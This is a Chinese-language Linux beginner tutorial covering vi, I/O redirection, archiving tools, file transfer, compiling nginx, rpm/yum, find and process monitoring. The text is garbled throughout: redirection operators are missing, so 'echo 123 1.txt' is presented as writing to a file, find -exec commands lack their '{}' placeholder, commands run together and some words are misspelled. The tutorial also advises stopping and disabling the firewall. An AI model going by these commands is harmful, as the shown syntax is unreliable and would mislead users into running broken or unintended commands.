#搜索整个文件，将所有的old替换为new，每次都要你确认是否替换(y/n/a/..)，y表示确认替换一个、n表示不替换、a表示全部替换 1-4 退出编辑器## :w 将缓冲区写入文件，即保存修改到硬盘上，但是不退出vi，如果我们改到一半的时候可以提前保存一下，以防断电，因为新编辑的数据是在内存中的，而且vi不会自动保存。## :wq 保存修改并退出## :x 保存修改并退出，和wq一样的效果。## :q 退出，如果对缓冲区进行过修改，则会提示## :q! 强制退出，放弃修改## :wq! 强制保存修改并退出 1-5 vi注意问题和原理说明### vi编辑内容原理 ## 注意，如果内存中的数据没有修改，没什么事儿，如果修改了，并且不小心断开连接了，也就是没有正常退出vi，比如我们看一下： ## 那么这个隐藏文件会一直在硬盘上，当我们再次vi修改jaden.txt的时候，就会看到如下提示信息： ## 这是提示你，已经有这个 .jaden.txt.swp 文件了。你看到这个提示信息就要考虑一下，是不是自己之前不小心没保存就掉线了，还是说有其他人正在编辑这个文件。如果是自己之前没有保存，那么可以选择删除这个隐藏的swp文件，再编辑就没有这个提示了，这是最简单的方式。或者输入 vi -r jaden.txt 会看到自己之前保存的内容，重新 wq! 保存一下，然后再删除 .jaden.txt.swp 文件即可，自己之前的修改也就还在。##vim编辑的时候会提示如下 ## 如果是有其他人在编辑这个文件，你就输入O，表示只读模式打开，E是直接编辑，R是恢复文件，Q是退出不编辑了，A是中止操作。其实还有个D指令，直接删除隐藏文件。 1-6 不会vi怎么办## 可以把文件拷贝到物理机，通过物理机的记事本或者nodepad++等编辑器修改，修改完去替换原文件即可。## 比如xftp就可以帮我们下载文件。但是如果一个比较大的文件，我们只改动一点内容，就可以学学vi，没必要上传下载文件来操作，耗时。 2.12.2 输入输出重定向2-1 输出重定向01–清空文件## 输出： ## 输出重定向， 将命令执行结果不输出到屏幕上，输出到文件里，会清空原文件，所以输出的时候一定要注意，文件名称要看好了。 [root@localhost ~]# head -20 services 2.txt [root@localhost ~]# cat 2.txt [root@localhost ~]# seq 100 1.txt [root@localhost ~]# echo 123 1.txt [root@localhost ~]# cat 1.txt 123 ## 清空文件内容 [root@localhost ~]# 1.txt [root@localhost ~]# cat 1.txt 2-2 输出重定向02–追加## 输出追加重定向，不会清空原文件 [root@localhost ~]# echo aaaaa 2.txt [root@localhost ~]# cat 2.txt 2-3 标准正确–错误输出重定向## 如果输出文件还没指定，则自动创建[root@localhost ~]# cat jaden.txt 11.txt 22.txt # 指令正确会将数据保存到1.txt中 2-4 输入重定向## 输入： ## 输入重定向 [root@localhost ~]# cat jaden.txt 3.txt # 将jaden.txt的数据输入过来并写入3.txt中 [root@localhost ~]# cat jaden.txt ## 输入追加重定向(这个就不演示了，遇到了再说) # 标准输入0，支持用户直接输入内容 [root@localhost ~]# cat 0 1 2 2222 0 ## 输入0就退出 1 2 2222 [root@localhost ~]# cat 0 22.txt ## 给屏幕输入一些内容，并保存到文件里 a b ddd 0 [root@localhost ~]# cat 22.txt a b ddd 2.13 Linux 压错打包2.13.1 tar——（.tar.gz结尾)1-1 tar压缩和解压缩# 压缩文件有时候我们也叫做归档文件。但是归档和压缩有一些区别，归档只是将多个文件捆绑成一个文件，并没有压缩，而压缩才是将大小压缩的更小。#Linux最常用的压缩和解压指令是：## tar：能够解压的文件格式是xx.tar.gz ## 压缩：tar -zcf 压缩包路径 目标1 目标2 目标3 ... ## 解压：tar -zxf 解压路径 ## 例子1：压缩和解压文件 [root@localhost ~]# ls ## 123.txt 4.txt a.txt c.txt jaden.txt 1.txt anaconda-ks.cfg b.txt jaden.tar.gz services ## 删除所有文件 [root@localhost ~]# rm -f * [root@localhost ~]# ls ## 复制文件 [root@localhost ~]# cp /etc/services . ## 压错 [root@localhost ~]# tar -zcf jaden.tar.gz services #把services 文件压缩成jaden.tar.gz [root@localhost ~]# ls -lh -rw-r--r-- 1 root root 134K 3月 22 14:51 jaden.tar.gz -rw-r--r-- 1 root root 655K 3月 22 11:22 services [root@localhost ~]# rm -f services # 删除原文件之后就再解压 [root@localhost ~]# tar -zxf jaden.tar.gz # 解压文件 [root@localhost ~]# ls -lh -rw-r--r-- 1 root root 134K 3月 22 14:51 jaden.tar.gz -rw-r--r-- 1 root root 655K 3月 22 11:22 services #看到和源文件一样的文件，包括文件属性也一样。 ## 同时压缩好几个文件 ## 把1.txt 和 aini 目录分别压缩成kk.tar.hz和jj.tar.gz tar -zcf kk.tar.jz jj.tar.gz 1.txt aini ## 把1.txt 和 jaden压缩到/tmp/oo.tar.gz tar -zcf /tmp/oo.tar.gz 1.txt jaden 1-2 tar归档#归档，但是不压缩 tar -cf [root@localhost ~]# cp /etc/services ./shike # 再拷贝一个services文件过来 [root@localhost ~]# ls -lh -rw-r--r-- 1 root root 13M 3月 22 14:58 2.tar.gz -rw-r--r-- 1 root root 134K 3月 22 14:56 jaden.tar.gz -rw-r--r-- 1 root root 655K 3月 22 14:55 services -rw-r--r-- 1 root root 655K 3月 22 15:04 shike [root@localhost ~]# tar -cf 3.tar.gz services shike #归档，但是不压缩 [root@localhost ~]# ls -lh -rw-r--r-- 1 root root 13M 3月 22 14:58 2.tar.gz -rw-r--r-- 1 root root 1.3M 3月 22 15:04 3.tar.gz #看大小就知道没有压缩大小。 -rw-r--r-- 1 root root 134K 3月 22 14:56 jaden.tar.gz -rw-r--r-- 1 root root 655K 3月 22 14:55 services -rw-r--r-- 1 root root 655K 3月 22 15:04 shike 1-3 查看压缩包内容[root@localhost ~]# tar -tf 3.tar.gz servicesshike## tar这个指令的参数可以不加## tar tf 3.tar.gz## linux系统下解压文件的时候，不同格式的压缩包需要使用不同的命令来解压或者压缩。 2.13.2 gzip—-（.gz结尾)#打包和压缩 gzip #压缩文件，会自动删除原文件，和tar不同，tar会留着原文件 [root@localhost ~]# gzip services [root@localhost ~]# ls -lh 总用量 15M -rw-r--r-- 1 root root 133K 3月 22 14:55 services.gz -rw-r--r-- 1 root root 655K 3月 22 15:04 shike # 解压，会自动删除原压缩包 [root@localhost ~]# gzip -d services.gz [root@localhost ~]# ls -lh 总用量 16M -rw-r--r-- 1 root root 655K 3月 22 14:55 services -rw-r--r-- 1 root root 655K 3月 22 15:04 shike #压缩多个文件，每一个文件产生一个单独的压缩包 [root@localhost ~]# gzip services shike [root@localhost ~]# ls -lh 总用量 15M -rw-r--r-- 1 root root 133K 3月 22 14:55 services.gz -rw-r--r-- 1 root root 133K 3月 22 15:04 shike.gz #解压缩 [root@localhost ~]# gzip -d services.gz shike.gz [root@localhost ~]# ls -lh 总用量 16M -rw-r--r-- 1 root root 655K 3月 22 14:55 services -rw-r--r-- 1 root root 655K 3月 22 15:04 shike ## gzip其实感觉并不太好用，但是工作中我们可能会遇到gzip的压缩包。 2.13.3 zip （.zip结尾）#压缩 zip 例子1： [root@localhost ~]# zip -r 1.zip services shike #会保留原文件 adding: services (deflated 80%) adding: shike (deflated 80%) [root@localhost ~]# ls -lh 总用量 16M -rw-r--r-- 1 root root 267K 3月 22 15:25 1.zip -rw-r--r-- 1 root root 655K 3月 22 14:55 services -rw-r--r-- 1 root root 655K 3月 22 15:04 shike #解压 unzip 例子1： # 解压之前先把原文件删掉，以免冲突 [root@localhost ~]# unzip 1.zip [root@localhost ~]# ls -lh 总用量 16M -rw-r--r-- 1 root root 267K 3月 22 15:25 1.zip -rw-r--r-- 1 root root 655K 3月 22 14:55 services -rw-r--r-- 1 root root 655K 3月 22 15:04 shike 2.13.4 rar解压## windows上常见的rar格式的压缩包，在linux上其实比较难解压，需要我们安装专业的工具： #解压rar包 #需要安装软件 yum install epel-release -y yum install unar -y #再进行解压 unar -o 解压路径 被解压文件路径 ## 例如： unar -o /opt 456.rar ## 如下[root@localhost ~]# ls1.zip 2.tar.gz 3.tar.gz jaden.rar jaden.tar services shike[root@localhost ~]# mkdir xx[root@localhost ~]# unar -o ./xx jaden.rar ## 把jaden.rar 解压到./xx目录下jaden.rar: RAR 5 jaden.txt (49 B)... OK.Successfully extracted to ./xx/jaden.txt.[root@localhost ~]# ls xx/jaden.txt## 尽量不要给linux发送rar的压缩包。全世界通用的是zip格式的压缩包。好，关于压缩和解压我们就先说这么多。 2.14 文件传输及网络文件下载## 和Linux进行文件传输，大概有下面这么几种情况，看图 2.14.1 网站下载文件#下载文件 ## curl #下载文件 curl -o 本地存放路径 文件网址 例如：有些网站在后台可能禁了curl下载，导致下载不下来 curl -o 123.zip https://github.com/nmap/nmap/archive/refs/heads/master.zip ## wget 文件网址 # 需要自行安装一下才有这个功能，curl是系统自带的 yum install -y wget [root@localhost ~]# wget https://github.com/nmap/nmap/archive/refs/heads/master.zip # wget比curl方便，最起码不需要指定文件名，curl如果不指定文件名路径的话会将文件内容打印在屏幕上 #使用curl和wget的前提是要有网#检查网络畅通## ping 例子1：ping 223.5.5.5 #如果网不通，重启网络服务 ystemctl restart network #查看文件类型 file 例子1： file 123.zip 2.14.2 scp传输# 我们准备两台linux虚拟机来玩：#主要用于linux和linux服务器之间传输文件，scp要求接受数据的一方要开启了ssh服务端才行，如果你电脑是苹果电脑mac系统，也可以使用scp来传输。windows往linux上面发送文件也可以用scp，但是只能单向的，因为windows上没有ssh服务端。#把本地文件推送到远程服务端 # 格式： scp 本地文件路径 远程主机用户@远程主机ip地址:远程主机某个目录 scp typora-setup-x64.exe root@10.0.0.128:/tmp #把远端服务文件拉取到本地 # 格式：scp 远程主机用户@远程主机ip地址:远程主机某个文件路径 本地路径 scp root@10.0.0.128:/tmp/typora-setup-x64.exe .## win10及以上版本是有scp指令的，win和win之间是不能使用scp互相传文件的，因为windows上默认是没有ssh的服务端的，只有客户端。# windows使用scp给linux上传文件的时候，文件路径和文件名中不允许出现中文和空格。# 格式和上面一样scp typora-setup-x64.exe root@10.0.0.128:/tmp ## mac系统也是直接可以使用scp来给linux上传文件的。 2.14.3 rz和sz(win —————— linux)#上传和下载 rz #上传 sz #下载#先安装lrzsz软件包 yum install lrzsz -y#上传的例子 ## 如果使用xshell，直接鼠标拖拽，或者执行rz -E选择要上传的文件#下载的例子 sz /root/test3.tar.gz 2.14.4 xftp上传下载## 这个我们都会玩了，就不演示了。 2.15 软件安装## 学习这个课程之前，我们先将虚拟机恢复一下快照。## 不管是什么系统，安装软件都有多种方式。比如前面讲解windows的时候，我们也说到了几种安装方式，linux也不列外，也有多种软件安装方式。而linux安装软件其实是比windows要复杂一些的，原因如下 ## Linux软件安装复杂主要就复杂在软件的依赖文件上了，也叫做依赖包，要想安装某个软件，先要去安装它的依赖包。 2.15.1 编译安装## 我们有时候安装软件，下载下来的是软件源代码，不能直接运行，需要编译之后才能运行，源代码--编译--二进制机器码，才能运行。比如windows的某些软件是从源代码编译打包之后才生成exe程序，平常我们接触不到，大家安装的软件都是基本别人编译好的。而linux下编译之后会生成二进制的可执行文件，不是exe程序昂，和windows不同，这种文件没有后缀名。其实linux系统下就没有文件后缀名这个概念，好多后缀名都是我们人工自己加上去的，为了让自己知道文件是干嘛的，主要是给我们自己看的，区分作用。## 我们用一个网站服务软件来玩一玩试试：1.下载源码包 cd /opt/ rm -fr * curl -o nginx.tar.gz http://nginx.org/download/nginx-1.20.1.tar.gz 2.编译安装 tar xf nginx.tar.gz cd nginx-1.20.1/ [root@localhost nginx-1.20.1]# ls auto CHANGES CHANGES.ru conf configure contrib html LICENSE man README src# 1.配置编译参数 # 这个软件给我们提供了很多功能，我们在编译的过程中可以自己选择哪些功能要，哪些功能不要，所有功能都要就是完整版，好多功能都 不要就成了精简版，比如qq精简版，不知道大家听没听过。 ./configure --prefix=/usr/local/nginx --without-pcre --without-http_rewrite_module --without-http_gzip_module #我这里禁掉了一些功能，以为这些功能都需要好多依赖包，大家还不知道依赖包是怎么回事儿，所以我就暂时先删除了。--without就是去掉的意思。--prefix=/usr/local/nginx是指定软件的安装目录，目录不存在的话会自动创建。./是用相对路径来执行这个configure文件，用绝对路径也可以执行这个文件。这个指令执行之后，会自动检查各种依赖环境是否满足软件运行的要求，检查通过之后会生成一个叫做Makefile的文件。 [root@localhost nginx-1.20.1]# ls auto CHANGES.ru configure html Makefile objs src CHANGES conf contrib LICENSE man README #多了两个文件Makefile和objs，刚才的指令主要是为了生成Makefile # 2.编译 make #make会找当前目录中的Makefile文件来进行编译，这个编译过程一般是比较长的。到底多长时间呢？1、看CPU性能 2、软件功能复杂度 [root@localhost nginx-1.20.1]# ls auto CHANGES.ru configure html Makefile objs src CHANGES conf contrib LICENSE man README # 编译之后看上去目录结构和之前一样，但是objs目录里面其实多了好多东西。 [root@localhost nginx-1.20.1]# ls objs/ autoconf.err nginx ngx_auto_config.h ngx_modules.c src Makefile nginx.8 ngx_auto_headers.h ngx_modules.o # 其中nginx文件就是我们的二进制可执行的命令文件。它是可执行的程序了，比如我们查看一下它的版本 [root@localhost nginx-1.20.1]# ./objs/nginx -v nginx version: nginx/1.20.1 # 到这里只是编译完了，还需要安装，其实安装就是将这个程序的某些文件放到对应的目录中去。其实我们在上面的编译参数中已经指定 好了--prefix=/usr/local/nginx，要安装到/usr/local/nginx目录中去。# 3.安装make install # 查看安装目录，这就是它这个软件安装的所有文件 [root@localhost nginx-1.20.1]# ls /usr/local/nginx/ conf html logs sbin # 这样看目录结构看着不太清晰，我们可以安装一下tree这个工具，来进行目录查看 [root@localhost nginx-1.20.1]# yum install tree -y # 安装完tree之后，我们来看一下目录，看着就清晰多了，树状结构显示。 [root@localhost nginx-1.20.1]# tree /usr/local/nginx/ /usr/local/nginx/ ├── conf # 该软件的配置文件所在目录 │ ├── fastcgi.conf │ ├── fastcgi.conf.default │ ├── fastcgi_params │ ├── fastcgi_params.default │ ├── koi-utf │ ├── koi-win │ ├── mime.types │ ├── mime.types.default │ ├── nginx.conf │ ├── nginx.conf.default │ ├── scgi_params │ ├── scgi_params.default │ ├── uwsgi_params │ ├── uwsgi_params.default │ └── win-utf ├── html # 网站源代码存放目录，这个nginx其实主要是用来部署网站的，网站的代码可以放到这个 目录中 │ ├── 50x.html │ └── index.html ├── logs # 这个软件自带日志记录功能，记录的日志存放在这个目录中 └── sbin └── nginx # 这个是软件的关键性的启动程序，类似于我们windows安装的qq目录中的QQ.exe 4 directories, 18 files3.运行 ## 指令：/usr/local/nginx/sbin/nginx，没有配置环境变量，所以要用完整路径来运行 [root@localhost nginx-1.20.1]# /usr/local/nginx/sbin/nginx [root@localhost nginx-1.20.1]# #看上去没什么效果，但是已经运行了 # 可以通过浏览器访问这个nginx了，访问之前要关闭一下防火墙。 # 关闭防火墙 systemctl stop firewalld # 取消防火墙的开机自启 systemctl disable firewalld # 使用浏览器访问http://虚拟机的ip地址 ## http://192.168.61.132/ 就可以看到网站了。 ## 关于nginx这个软件如何使用，我们后面课程中会详细的讲解，这里先简单感受一下编译安装过程即可。 # 打包：就是将我们编译好的程序打包起来，给其他人用的时候，其他人就不用编译了，因为你已经编译好了，我们普通用户使用的软件就 是别人编译打包之后的软件。 ## /usr/local/nginx 这个目录就是我们编译好之后的整个软件的所有运行文件目录，我们打包它即可 # 打包压缩 [root@localhost nginx-1.20.1]# cd /usr/local/ [root@localhost local]# ls bin etc games include lib lib64 libexec nginx sbin share src [root@localhost local]# tar -zcf /tmp/nginx_jaden.tar.gz nginx [root@localhost local]# ls bin etc games include lib lib64 libexec nginx sbin share src [root@localhost local]# ls /tmp/ ks-script-ed2ODG nginx_jaden.tar.gz # 推送给另外一台主机 [root@localhost tmp]# scp nginx_jaden.tar.gz root@192.168.61.135:/tmp # 另外一台主机的操作：解压到/usr/local目录下，然后运行 root@localhost tmp]# ls nginx_jaden.tar.gz [root@localhost tmp]# mv nginx_jaden.tar.gz /usr/local/ [root@localhost tmp]# cd /usr/local/ [root@localhost local]# ls bin etc games include lib lib64 libexec nginx_jaden.tar.gz sbin share src [root@localhost local]# tar -zxf nginx_jaden.tar.gz [root@localhost local]# ls bin etc games include lib lib64 libexec nginx nginx_jaden.tar.gz sbin share src [root@localhost local]# /usr/local/nginx/sbin/nginx [root@localhost local]# systemctl stop firewalld 2.15.2 rpm安装# 刚才我们提到过，编译还是比较繁琐的，为了方便使用者，一般都会编译之后发给使用者，用起来不需要编译，就方便多了。只要有人编译一次，将编译后的程序贡献出来，大家就可以用了。所以这些做系统的厂商也发现这样挺好，所以这些厂商干脆将自己的软件也打包一下，redhat、debian等都做了自己软件的打包工作，将自己的软件打包好之后，供用户下载使用。下载软件需要用到对应系统的包管理工具。# redhat系打出来的包叫做：rpm包。用yum安装的程序包其实都是rmp包，比如刚才安装的tree。rpm的包我们也可以不使用yum而手动安装。# debian系打出来的包叫做：deb包。#rpm全称：redhat package manager包管理器# 手动安装rpm包示例：不需要编译安装、也不用yum安装。# 安装wget yum install wget -y# 使用wget下载rpm包 wget https://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/tree-1.6.0-10.el7.x86_64.rpm # 如果没有wget，可以先用curl下载： curl -o wget.rpm https://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/wget-1.14-18.el7_6.1.x86_64.rpm # 安装rpm包 #rpm -i是安装，vh是显示安装进度条的意思。 rpm -ivh tree-1.6.0-10.el7.x86_64.rpm # 卸载 rpm -e tree# 升级 rpm -Uvh xxx.rpm# 查看已安装的软件 rpm -qa|grep httpd#以树状的显示指定目录下的目录和文件的名称 tree 例子1： tree /usr/local## rpm安装软件个小问题：## 比如：安装vim，会提示安装失败，需要各种依赖包，需要先去安装依赖包。wget http://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/vim-enhanced-7.4.629-7.el7.x86_64.rpmrpm -ivh vim-enhanced-7.4.629-7.el7.x86_64.rpm## 所以，用rpm安装软件不好解决依赖包的问题，所以出来了下面的yum安装方式，自动下载安装需要的依赖包。以后都用yum来安装。 2.15.3 yum安装#自动解决rpm依赖#yum安装扩展yum仓库 yum install epel-release -y#yum安装nginx yum install nginx -y#yum移除nginx yum remove nginx -y#查看仓库rpm的数量 yum repolist ## 编译安装：优点： 自由定制 痛点：难度高，步骤繁琐## rpm安装：优点：安装简单 痛点：需要自己解决依赖，不支持定制## yum安装：优点：自动解决依赖，默认安装最新版 痛点：不支持定制 2.15.4 yum仓库(镜像站)## 如下，安装工具时会提示：自动会从下面的仓库中来下载软件包，centos的官方库在国外http://mirror.centos.org/， ## 这个仓库地址是在centos中配置的，在如下配置文件中[root@localhost ~]# cd /etc/yum.repos.d/[root@localhost yum.repos.d]# lsCentOS-Base.repo CentOS-Debuginfo.repo CentOS-Media.repo CentOS-Vault.repoCentOS-CR.repo CentOS-fasttrack.repo CentOS-Sources.repo CentOS-x86_64-kernel.repo# 有几个repo文件，表示配置了几个仓库，其中大部分是禁用状态的，默认就一个启用的CentOS\u0002Base.repo。比如我们看一个文件CentOS-Vault.repo CentOS-Vault.repo如下，看不到enabled0的表示启用状态 CentOS-Base.repo如下： ## 但是国外的地址下载软件太慢了，所以centos官方说我允许你们和我同步，比如华为，你和我同步一下，做一个你国内的镜像库，这就是华为的yum仓库了或者说镜像站了，很多企业和学校都有自己的镜像站。那么我们yum安装的时候有看到，明明使用的是国内的镜像站呀，这是怎么做到的，其实配置文件中做了一个镜像地址列表，如下 ## 我们拿出来这个地址改一改http://mirrorlist.centos.org/?release=$releaseverarch=$basearchrepo=osinfra# $releasever表示版本# $basearch表示32还是64位# repo=os表示我们要下载的是操作系统相关的东西# infra这个参数没什么用，可删掉# 那么我们改一改网址，如下http://mirrorlist.centos.org/?release=7arch=x86_64repo=os# 访问一下这个地址。## 效果如下 ## 这就是为什么，我们用yum安装软件的时候，仓库地址都是国内的镜像站地址的原因了，它会自动选择离我们最近、网速最佳的几个地址来下载。 2.16 find文件查找## 文件查找，我们在windows用的比较多，系统自带的搜索方式、第三方搜索工具everything等。# linux上没有图形化界面，就要借助find指令来查了。 2.16.1 普通查询# 普通查询 find /etc -maxdepth 1 -type f -name pa* 命令 目录... 查找深度 类型 文件名称包含 # -type文件类型：f表示文件，不指定类型的话，文件和目录都会查找 # -maxdepth查找深度：目录层级的意思，不指定的话，就按照最大深度来查找 # pa*： *表示匹配任意pa开头的内容，*号还可以写在开头 2.16.2 按照大小查找## 按照文件大小查找(单位kMG,k要小写，MG要大写，不带单位就按照b单位来查找) 1.查找大于100M的文件 find / -type f -size +100M [root@localhost tmp]# find / -type f -size +100M /proc/kcore find: ‘/proc/1945/task/1945/fdinfo/6’: 没有那个文件或目录 # proc是进程目录，有些进程运行起来之后能看到文件信息，程序运行结束之后，进程文件也消失了，所以看到proc的报错很正常，并且proc的权限很高，不是一般人可以访问的，所以也经常会报权限不够等错误信息，所以以后看到proc的报错直接忽略即可。 find: ‘/proc/1945/fdinfo/5’: ## 没有那个文件或目录/sys/devices/pci000000/0000:00:0f.0/resource1_wc/sys:/devices/pci0000:00/0000:00:0f.0/resource1/var/cache/yum/x86_64/7/updates/gen/primary_db.sqlite/usr/lib/locale/locale-archive [root@localhost tmp]# ls -h /usr/lib/locale/locale-archive #大小确实超过了100M -rw-r--r--. 1 root root 102M 3月 15 20:10 /usr/lib/locale/locale-archive 2.查找小于2k的文件 find /root/nginx-1.20.2 -type f -size -2k 3.查找大于50M同时小于100M的文件 find / -type f -size +50M -and -size -100M 2.16.3 忽略大小写## 忽略大小写查询 find /etc -maxdepth 1 -iname pa* # i是ignore的简写，忽略的意思 2.16.4 根据修改时间查找文件## 根据修改时间查找文件 [root@localhost ~]# stat 1.txt 文件：1.txt 大小：0 块：0 IO 块：4096 普通空文件 设备：801h/2049d Inode：67108933 硬链接：1 权限：(0644/-rw-r--r--) Uid：( 0/ root) Gid：( 0/ root) 环境：unconfined_u:object_r:admin_home_t:s0 最近访问：2023-03-23 09:04:35.339235371 +0800 #Access time 最近更改：2023-03-23 09:04:35.339235371 +0800 #Modify time 最近改动：2023-03-23 09:04:35.339235371 +0800 #Change time 创建时间：- ## 时间参数：atime mtime ctime amin mmin cmin #(time是按照天来查找，min是按分钟查找)# 时间单位为天find /opt -type f -mtime -1 #-1代表一天以内，+1一天以前# 时间单位为分钟 [root@localhost ~]# find /root -type f -mmin -20 /root/.bash_history /root/ReadMe.txt /root/.lesshst# 查找1天之前，10天之内，修改过的文件 [root@localhost ~]# find /etc/ -type f -mtime +1 -and -mtime -10 2.16.5 取反：！## 取反: ! [root@localhost ~]# find /root -type f -name *.txt # 找名称以.txt结尾的文件 /root/1.txt /root/学习前准备.txt [root@localhost ~]# find /root -type f ! -name *.txt # 找名称中不是.txt结尾的文件 /root/.bash_logout /root/.bash_profile [root@localhost ~]# mkdir jaden [root@localhost ~]# mkdir wulaoban [root@localhost ~]# find /root -type f # 找文件 /root/.bash_logout /root/.bash_profile [root@localhost ~]# find /root ! -type f # 找文件夹 /root/jaden /root/wulaoban 2.16.6 根据用户来查找文件## 根据用户来查找文件 [root@localhost ~]# useradd jaden [root@localhost ~]# find / -user jaden # 查找属于jaden用户的所有目录和文件 /var/spool/mail/jaden /home/jaden /home/jaden/.bash_logout /home/jaden/.bash_profile /home/jaden/.bashrc ## 根据用户组来查 [root@localhost ~]# find / -group jaden 2.17.7 ## 对找出的文件进行处理# 格式：正常的find语句+操作exec# 比如我们查找到了一些病毒文件，想直接删除 find /tmp -type f -size +10K -exec rm rf \\; # 表示我们找到的那些文件，\\;是这样的：正常exec语句最后要分号结尾，但是分号在linux中有特殊的意义 ## 比如一次性执行两个指令可以 ls -lh;id，这样执行，所以要对;进行转义，意思是不要将;作为shell指令的分隔 ## \\就是转义符号。例子： [root@localhost tmp]# find /tmp -name vm* -exec rm -rf \\; find: ‘/tmp/vmware-root_560-2957190359’: 没有那个文件或目录 find: ‘/tmp/vmware-root_555-4282367637’: 没有那个文件或目录 find: ‘/tmp/vmware-root_631-4021718894’: 没有那个文件或目录 [root@localhost tmp]# ls ks-script-ed2ODG nginx_jaden.tar.gz systemd-private-d38b668730bf4589896221daead5dbea-chronyd.service-be3NkFyum.log# 下面的例子就不演示了。find /root -type f -mmin -30 ! -name .* -exec rm \\;find /root -maxdepth 1 -type d -name Apa* -mmin -30 -exec cp -a /tmp \\; # 复制到tmp目录中 2.17 进程管理## 操作系统都有进程的概念，windows在任务管理器中查看，linux用ps指令来查看。 2.17.1 查看和关闭进程#查看进程 ps 参数1：ps -ef # pid：全称process id，是进程编号，每次启动某个程序，它的编号可能都不一样，这个是程序启动之后系统随机分配的。# uid：全称user id，是进程所属用户，也就是哪个用户启动的，我们可以切换个用户执行一下sleep 60，就可以看到效果# CMD中看到[]括起来的，表示这些都是系统级别的进程，比如一些硬件驱动程序之类的，这些都不要动。不带[]的都是用户级别的。# ppid：全称parent process id，父进程，记录的是某个进程是由哪个进程创建出来的。可以通过pstree工具来查看从属关系。# C：这个不用管。# STIME：全称start time，进程的启动时间。# TTY： 用来显示哪些是本地启动的，哪些是远程终端连接上来启动的。通过w指令可以看到哪些终端登录着主机。只要登录成功一个终端，那就多一个终端。# TIME：这个没啥用# CMD：这个进程执行了什么指令## 安装一个pstree# 注意：我们安装的软件的名字和使用的时候的指令名称不一定是一样的，比如lrzsz，使用的时候是rz\\sz上传下载。# 想查看我们想要使用的某个指令，是哪个软件包提供的，可以输入yum provides 指令名称，比如yum provides pstree [root@localhost ~]# yum provides pstree [root@localhost ~]# yum install psmisc -y [root@localhost ~]# pstree# 可以看到，系统的第一个进程是systemd，由他创建起来了好多其他的进程，可以看到从属关系： systemd─┬─NetworkManager─┬─dhclient │ └─2*[NetworkManager] ├─VGAuthService ├─abrt-watch-log ├─abrtd ├─agetty ├─auditd───auditd ├─chronyd ├─crond ├─dbus-daemon───dbus-daemon ├─master─┬─pickup │ └─qmgr ├─polkitd───6*[polkitd] ├─rsyslogd───2*[rsyslogd] ├─sshd─┬─sshd───bash───pstree │ └─sshd───bash ├─systemd-journal ├─systemd-logind ├─systemd-udevd ├─tuned───4*[tuned] └─vmtoolsd───vmtoolsd #关闭进程 kill pid号 例子1： kill 7851 #使用进程id号，来终止进程 kill -9 pid号 #慎用！！！#批量关闭进程，pkill全称program kill pkill CMD命令名称 例子1： pkill sleep #使用进程的命令名称，来终止进程，会中止所有CMD执行着sleep的进程的。 pkill -9 sleep # kill -9，这个强大和危险的命令迫使进程在运行时突然终止，进程在结束后不能自我清理。危害是导致系统资源无法正常释放，一般不推荐使用，除非其他办法都无效。# 如果想把某个远程连接踢下线，可以杀掉显示pts的远程连接进程的父进程，如下图 2.17.2 查看计算机硬件信息2-1 查看cpu#查看cpu lscpu 2-2 查看内存命令#查看内存命令 free -h 2-3 查看硬盘命令#查看硬盘命令 df -h #h表示人类可读 [root@localhost ~]# df -h 文件系统 容量 已用 可用 已用% 挂载点 devtmpfs 980M 0 980M 0% /dev tmpfs 991M 0 991M 0% /dev/shm tmpfs 991M 9.5M 981M 1% /run tmpfs 991M 0 991M 0% /sys/fs/cgroup /dev/sda1 100G 2.2G 98G 3% / tmpfs 199M 0 199M 0% /run/user/0 2-4 查看计算机的cpu，内存，进程等信息# 含有tmp的表示是内存给硬盘的空间，默认会给1半内存空间，把内存当作硬盘使用，这个我们不用管。# 查看计算机的cpu，内存，进程等信息(和windows的任务管理器很像)top top - 08:34:27 up 20 min, 1 user, load average: 0.00, 0.01, 0.05 Tasks: 89 total, 2 running, 87 sleeping, 0 stopped, 0 zombie %Cpu(s): 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 2027872 total, 1779000 free, 135668 used, 113204 buff/cache KiB Swap: 0 total, 0 free, 0 used. 1755332 avail Mem # 下面是进程信息，值得看的是每个进程占用的%CPU %MEM，CPU使用率和内存使用率 PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1 root 20 0 128556 7132 4144 S 0.0 0.4 0:01.27 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kthreadd 4 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H# 08:34:27 up 20 min：表示08:34:27是系统当前时间，开机了20分钟，如果看到3:20，表示开了3小时20分钟，看到10 days表示10天了，linux很稳定耐用，开机好多年都稳定运行着，不会卡顿。# 1 user ：表示当前只有一个用户在使用# load average: 0.00, 0.01, 0.05：平均负荷，指的是CPU的负载高不高，CPU负载高，那么平均负荷就比较大，如果这几个值很大的时候，服务器会变得很卡。如果发现服务器卡了，就是异常情况，就可以看看这个数据。这三个值表示：1分钟、5分钟、15分钟的负载情况，load average数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。# Tasks: 89 total， 2 running, 87 sleeping, 0 stopped, 0 zombie：表示进程数量，总共89个，2个正在运行，87个在睡眠状态，当我们的CPU是1核的时候，是在所有进程之间来回切换执行，所以只有一个或者切换速度很快的时候显示2个。 0 stopped表示停止的进程，但是这里一般都是0，以为进程结束之后会自动从内存中释放。0 zombie表示僵尸进程数量，僵尸进程是杀不死的，就是由于各种原因，系统无法自动释放的进程，僵尸进程也消耗系统资源，一般kill掉它的父进程可以杀掉僵尸进程，或者kill -来杀掉。但是kill -9要慎用！！！它也容易产生僵尸进程，kill会将进程运行中的信息保存下来，进程不会出问题，kill -9不会保存，强制结束进程的运行，容易出现僵尸进程。# 按数字1，可以查看cpu数量# %Cpu(s): 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 ## st，关于CPU我们其他参数不用看，就看这个100.0 id，id是idle的简写，表示100%空闲，因为我们现在 ## CPU使用率很低，所以显示了100%空闲。我们只关注这个参数即可，看一下CPU忙不忙就行。# KiB Mem : 2027872 total, 1779000 free, 135668 used, 113204 